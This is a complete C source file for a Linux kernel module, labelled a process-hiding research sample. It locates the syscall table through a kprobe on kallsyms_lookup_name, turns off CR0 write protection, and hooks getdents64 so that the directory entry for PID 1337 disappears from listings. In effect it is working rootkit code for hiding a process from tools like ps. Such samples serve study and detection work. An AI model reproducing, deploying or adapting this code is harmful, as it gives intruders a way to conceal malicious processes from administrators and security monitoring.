#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KM-1-Research");
MODULE_DESCRIPTION("getdents64 hook -- process hiding research sample");

#define TARGET_PID  "1337"

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t g_kallsyms_lookup_name;

static struct kprobe kp_kallsyms = {
    .symbol_name = "kallsyms_lookup_name",
};

static unsigned long *g_sys_call_table;
typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t g_orig_getdents64;

static void wp_disable(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0) : "memory");
}

static void wp_enable(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0) : "memory");
}

static long hooked_getdents64(const struct pt_regs *regs)
{
    long total, adjusted;
    char *kbuf;
    struct linux_dirent64 *ent;
    long pos;

    total = g_orig_getdents64(regs);
    if (total <= 0)
        return total;

    kbuf = kzalloc(total, GFP_KERNEL);
    if (!kbuf)
        return total;

    if (copy_from_user(kbuf, (void __user *)regs->si, total)) {
        kfree(kbuf);
        return total;
    }

    adjusted = total;
    pos = 0;

    while (pos < adjusted) {
        ent = (struct linux_dirent64 *)(kbuf + pos);
        if (strcmp(ent->d_name, TARGET_PID) == 0) {
            long tail = adjusted - pos - (long)ent->d_reclen;
            if (tail > 0)
                memmove(kbuf + pos,
                        kbuf + pos + ent->d_reclen,
                        tail);
            adjusted -= (long)ent->d_reclen;
        } else {
            pos += (long)ent->d_reclen;
        }
    }

    if (copy_to_user((void __user *)regs->si, kbuf, adjusted))
        adjusted = total;

    kfree(kbuf);
    return adjusted;
}

static int __init km1_init(void)
{
    int rc;

    pr_info("KM-1: initialising\n");

    rc = register_kprobe(&kp_kallsyms);
    if (rc < 0) {
        pr_err("KM-1: register_kprobe failed: %d\n", rc);
        return rc;
    }
    g_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp_kallsyms.addr;
    unregister_kprobe(&kp_kallsyms);

    pr_info("KM-1: kallsyms_lookup_name resolved to %px\n",
            g_kallsyms_lookup_name);

    g_sys_call_table = (unsigned long *)
        g_kallsyms_lookup_name("sys_call_table");
    if (!g_sys_call_table) {
        pr_err("KM-1: sys_call_table not found\n");
        return -ENOENT;
    }
    pr_info("KM-1: sys_call_table at %px\n", g_sys_call_table);

    g_orig_getdents64 =
        (orig_getdents64_t)g_sys_call_table[__NR_getdents64];

    wp_disable();
    g_sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    wp_enable();

    pr_info("KM-1: hooked getdents64, hiding PID " TARGET_PID "\n");
    return 0;
}

static void __exit km1_exit(void)
{
    wp_disable();
    g_sys_call_table[__NR_getdents64] = (unsigned long)g_orig_getdents64;
    wp_enable();
    pr_info("KM-1: getdents64 restored, unloading\n");
}

module_init(km1_init);
module_exit(km1_exit);
